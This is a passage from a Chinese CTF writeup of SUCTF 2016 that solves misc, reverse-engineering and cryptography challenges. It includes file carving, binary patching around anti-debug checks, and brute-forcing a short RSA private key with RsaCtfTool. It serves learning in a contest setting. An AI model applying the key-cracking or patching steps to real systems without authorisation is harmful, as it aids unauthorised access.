<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file SU</span><br><span class="line">SU: gzip compressed data, was &quot;SU&quot;, last modified: Sat Oct 29 19:43:07 2016, from Unix</span><br><span class="line">$ cat SU | gzip.exe -d</span><br><span class="line">fhpgs&#123;CP9PuHsGx#&#125;</span><br></pre></td></tr></table></figure>

<p>前几个肯定是 <code>suctf</code>，后面的按照规律解也可以，其实这是个 rot13，直接找个在线工具解了就行：<code>suctf&#123;PC9ChUfTk# &#125;</code>。</p>
<h1 id="Misc-这不是客服的头像嘛。。。。23333"><a href="#Misc-这不是客服的头像嘛。。。。23333" class="headerlink" title="[Misc] 这不是客服的头像嘛。。。。23333"></a>[Misc] 这不是客服的头像嘛。。。。23333</h1><p>下载下来是一张图片，用 <code>file</code> 看也是一张图片，然而用 <code>binwalk</code> 之后发现里面有个压缩包，用 <code>dd</code> 命令提取出来：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk xu.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL         HEX             DESCRIPTION</span><br><span class="line">-------------------------------------------------------------------------------------------------------</span><br><span class="line">46046           0xB3DE          RAR archive data</span><br><span class="line"></span><br><span class="line">$ dd if=xu.jpg of=xu.rar bs=1 skip=46046</span><br><span class="line">20221+0 records in</span><br><span class="line">20221+0 records out</span><br><span class="line">20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/s</span><br></pre></td></tr></table></figure>

<p>解压发现是一个 img 镜像（吐槽一下这丧心病狂的压缩率，能把 1440 压成 20……），打开发现是四张图片，分别是一个二维码的四个角，把它们拼起来，扫一下即可：<code>suctf&#123;bOQXxNoceB&#125;</code>。</p>
<h1 id="Re-先利其器"><a href="#Re-先利其器" class="headerlink" title="[Re] 先利其器"></a>[Re] 先利其器</h1><p>可以看出来里面是一个循环，循环结束后 <code>num</code> 为零，然后判断如果 <code>num</code> 不为零则显示答案。虽然可以 patch 二进制将这句话 nop 掉，但是由于这么简单，还是直接看伪代码吧。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( num &gt; <span class="number">9</span> ) &#123;</span><br><span class="line">    plaintext = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">    flag(&amp;plaintext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> *ret)</span> </span>&#123;</span><br><span class="line">    ret[<span class="number">12</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    ret[<span class="number">11</span>] = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line">    ret[<span class="number">10</span>] = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">    ret[<span class="number">9</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    ret[<span class="number">8</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    ret[<span class="number">7</span>] = <span class="string">&#x27;5&#x27;</span>;</span><br><span class="line">    ret[<span class="number">6</span>] = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">    ret[<span class="number">5</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    ret[<span class="number">4</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    ret[<span class="number">3</span>] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">    ret[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再加上循环里有一句 <code>flag[1] = &#39;_&#39;;</code>，于是就拼出来了：<code>suctf&#123;I_c@n_U5e_I6a&#125;</code>。</p>
<h1 id="Re-PE-Format"><a href="#Re-PE-Format" class="headerlink" title="[Re] PE_Format"></a>[Re] PE_Format</h1><p>发现文件头的 PE 和 MZ 标志刚好反了，于是将其改正，然后将 PE 文件头的位置从 <code>40</code> 改为 <code>80</code>，即可运行程序，然而程序没啥反应，于是上 IDA（居然是 x64 的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i ) &#123;</span><br><span class="line">    ans2[i] = ans[i];</span><br><span class="line">    ans[i] = ~ans[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后判断如果你的输入（<code>ans</code>）加密后跟 <code>secret</code> 相等则通过。<code>secret</code> 的内容是一段二进制：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000476010 ; char secret[23]</span><br><span class="line">.data:0000000000476010 secret  db 0BBh</span><br><span class="line">.data:0000000000476011         db  90h ;</span><br><span class="line">.data:0000000000476012         db 0A0h ;</span><br><span class="line">.data:0000000000476013         db 0A6h ;</span><br><span class="line">.data:0000000000476014         db  90h ;</span><br><span class="line">.data:0000000000476015         db  8Ah ;</span><br><span class="line">.data:0000000000476016         db 0A0h ;</span><br><span class="line">.data:0000000000476017         db  94h ;</span><br><span class="line">.data:0000000000476018         db  91h ;</span><br><span class="line">.data:0000000000476019         db  90h ;</span><br><span class="line">.data:000000000047601A         db  88h ;</span><br><span class="line">.data:000000000047601B         db 0A0h ;</span><br><span class="line">.data:000000000047601C         db 0AFh ;</span><br><span class="line">.data:000000000047601D         db 0BAh ;</span><br><span class="line">.data:000000000047601E         db 0A0h ;</span><br><span class="line">.data:000000000047601F         db 0B9h ;</span><br><span class="line">.data:0000000000476020         db  90h ;</span><br><span class="line">.data:0000000000476021         db  8Dh ;</span><br><span class="line">.data:0000000000476022         db  92h ;</span><br><span class="line">.data:0000000000476023         db  9Eh ;</span><br><span class="line">.data:0000000000476024         db  8Bh ;</span><br><span class="line">.data:0000000000476025         db 0C0h ;</span><br><span class="line">.data:0000000000476026         db    0</span><br></pre></td></tr></table></figure>

<p>于是随手写一段程序即可：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> secret[] = &#123;<span class="number">0xBB</span>, <span class="number">0x90</span>, <span class="number">0xA0</span>, <span class="number">0xA6</span>, <span class="number">0x90</span>, <span class="number">0x8A</span>, <span class="number">0xA0</span>, <span class="number">0x94</span>, <span class="number">0x91</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0xA0</span>, <span class="number">0xAF</span>, <span class="number">0xBA</span>, <span class="number">0xA0</span>, <span class="number">0xB9</span>, <span class="number">0x90</span>, <span class="number">0x8D</span>, <span class="number">0x92</span>, <span class="number">0x9E</span>, <span class="number">0x8B</span>, <span class="number">0xC0</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(secret); i++) &#123;</span><br><span class="line">        secret[i] = ~secret[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, secret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得出 flag：<code>suctf&#123;Do_You_know_PE_Format?&#125;</code>。</p>
<h1 id="Re-Find-correct-path"><a href="#Re-Find-correct-path" class="headerlink" title="[Re] Find_correct_path"></a>[Re] Find_correct_path</h1><p>上 IDA 分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line"><span class="keyword">if</span> ( v7 ) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v7 ) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        choose1(&amp;choice);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        choose2(&amp;choice);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        choose3(&amp;choice);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        choose4(&amp;choice);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(&amp;choice);</span><br><span class="line">    <span class="keyword">final</span>(&amp;choice, v6);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读入了 <code>v5</code>，然而判断了 <code>v7</code>，而且 <code>v5</code> 在 <code>v7</code> 前面，当然可以当 PWN 来做，但是更简单的方法是直接修改二进制，将第一句改为 <code>scanf(&quot;%d&quot;, &amp;amp;v7)</code> 即可，只需要改一个字符和一个地址。然后在 Linux 下运行即可，分别输入 1~4 看看结果如何：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ./Which_way_is_correct_rex</span><br><span class="line">1</span><br><span class="line">T2l1_w1y_lT_r!8Tt</span><br><span class="line">root@kali:~# ./Which_way_is_correct_rex</span><br><span class="line">2</span><br><span class="line">Th15_3ad_ls__!8he</span><br><span class="line">root@kali:~# ./Which_way_is_correct_rex</span><br><span class="line">3</span><br><span class="line">Thl5_way_ls_r!8ht</span><br><span class="line">root@kali:~# ./Which_way_is_correct_rex</span><br><span class="line">4</span><br><span class="line">Thl5lwaycTsTr7Tht</span><br></pre></td></tr></table></figure>

<p>很显然 3 是正确的，于是得到 flag：<code>suctf&#123;Thl5_way_ls_r!8ht&#125;</code>。</p>
<h1 id="Re-reverse04"><a href="#Re-reverse04" class="headerlink" title="[Re] reverse04"></a>[Re] reverse04</h1><p>吐槽一下，首先文件名是 <code>reverse03 .exe</code>（嗯，还有个空格），其次里面有各种系统调用和反调试。</p>
<p>先输入用户名和密码，然后利用三个替换规则分别对用户名的 0<del>3 位、4</del>7 位、8~11 位进行替换，结果存在字符串 <code>flag</code> 的特定区域（在代码中有写到 <code>flag</code> 的一些值为 <code>flag&#123;xxxxxxxxxxxxxxxxx&#125;</code>），然后对该区域进行一个 +1 的凯撒加密，判断与输入的密码是否相等。恶心就恶心在替换过程，<code>trans1</code> 使用了 <code>GetTickCount</code> 判断是否在调试，<code>trans2</code> 判断系统中是否有 <code>idaq.exe</code> 和 <code>idaq64.exe</code> 进程，<code>trans3</code> 使用了 <code>IsDebuggerPresent</code> 和 <code>__readfsdword</code> 判断是否在调试，这些判断的方法最终影响到了 <code>x1</code> 和 <code>x2</code>，然而第 i 个替换规则是这样的：<code>flag[X + 5] = Dict[i][F(x1, x2) + username[X]]</code>，其中 <code>F</code> 函数返回一个整数，<code>username[X]</code> 要取 ASCII 码。由于我不会系统调用，因此直接手动枚举的（反正替换的区域互不影响，最差也只需要六次枚举），最终得到 flag：<code>suctf&#123;antidebugabc&#125;</code>。</p>
<h1 id="Crypto-base"><a href="#Crypto-base" class="headerlink" title="[Crypto] base??"></a>[Crypto] base??</h1><p>根据题目提示猜想是 Base64，然而并不是，试了 Base32 可以了：<code>suctf&#123;I_1ove_Su&#125;</code>。</p>
<h1 id="Crypto-凯撒大帝"><a href="#Crypto-凯撒大帝" class="headerlink" title="[Crypto] 凯撒大帝"></a>[Crypto] 凯撒大帝</h1><p>根据提示是凯撒密码，将给的数字拆成 ASCII 的形式，然后按照 +4, +4, +15, +15, +4, +4… 的规律解码就可以了：<code>suctf&#123;I_am_Caesar&#125;</code>。</p>
<h1 id="Crypto-easyRSA"><a href="#Crypto-easyRSA" class="headerlink" title="[Crypto] easyRSA"></a>[Crypto] easyRSA</h1><p>注意到 public_key 超级短，因此可以用 <code>RsaCtfTool</code> 工具直接暴力破解出 private_key：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python RsaCtfTool.py --pkey ../easyRSA/public.key --pri &gt; ../easyRSA/private.key</span><br></pre></td></tr></table></figure>

<p>然后就可以用 <code>openssl</code> 来对数据进行解密了，得到 flag：<code>suctf&#123;Rsa_1s_ea5y&#125;</code>。话说谁说 RSA 简单的，明明只是 key 短。</p>
<h1 id="Crypto-普莱费尔"><a href="#Crypto-普莱费尔" class="headerlink" title="[Crypto] 普莱费尔"></a>[Crypto] 普莱费尔</h1><p>有在线的解密工具，先将下面一串 <code>WW91IGFyZSBsdWNreQ==</code> 翻译成 <code>You are lucky</code>，然后用它做 key，翻译上面的内容即可。得到 flag：<code>suctf&#123;charleswheatstone&#125;</code>。</p>
<h1 id="Crypto-很贱蛋呀"><a href="#Crypto-很贱蛋呀" class="headerlink" title="[Crypto] 很贱蛋呀"></a>[Crypto] 很贱蛋呀</h1><p>查看 <code>En.py</code> 文件，发现每一轮的 key 都不一样，而且每一位互不影响，群里也说答案都是可见字符，因此三重循环，第一重枚举 key，第二重枚举字符位置，第三重枚举该位置的字符：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cipher[<span class="number">30</span>] = &#123;<span class="number">75</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">215</span>, <span class="number">104</span>, <span class="number">138</span>, <span class="number">69</span>, <span class="number">213</span>, <span class="number">248</span>, <span class="number">30</span>, <span class="number">179</span>, <span class="number">212</span>, <span class="number">105</span>, <span class="number">33</span>, <span class="number">213</span>, <span class="number">249</span>, <span class="number">105</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)cipher);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> result[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> enc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">32</span>; x &lt;= <span class="number">127</span>; x++) &#123;</span><br><span class="line">        <span class="keyword">int</span> am = (key + x) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> gm = key * x;</span><br><span class="line">        <span class="keyword">if</span> ((am + gm) % <span class="number">255</span> == enc) &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">deal</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((result[index++] = solve(key, cipher[i])) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> key = <span class="number">0</span>; key &lt; <span class="number">128</span>; key++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (deal(key * <span class="number">101</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Found key = %d\n&quot;</span>, key);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found key = 110</span><br><span class="line">Goodlucktobreakme</span><br></pre></td></tr></table></figure>

<p>最终得出 flag：<code>suctf&#123;Goodlucktobreakme&#125;</code>。</p>
<hr>
<p>这次懒得写结尾了……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2016/11/06/2016-suctf-writeup/" data-id="clg6iymq20033guote141av7a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2016/11/15/2016-shctf-first-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2016 全国大学生网络安全邀请赛暨第二届上海市大学生网络安全大赛 Writeup
        
      </div>
    </a>
  
  
    <a href="/2016/10/26/analytics-about-mirai/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">对 Mirai 病毒的初步分析——物联网安全形式严峻</div>
    </a>
  
</nav>

  
</article>

</section>
        
        <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 All Members<br>
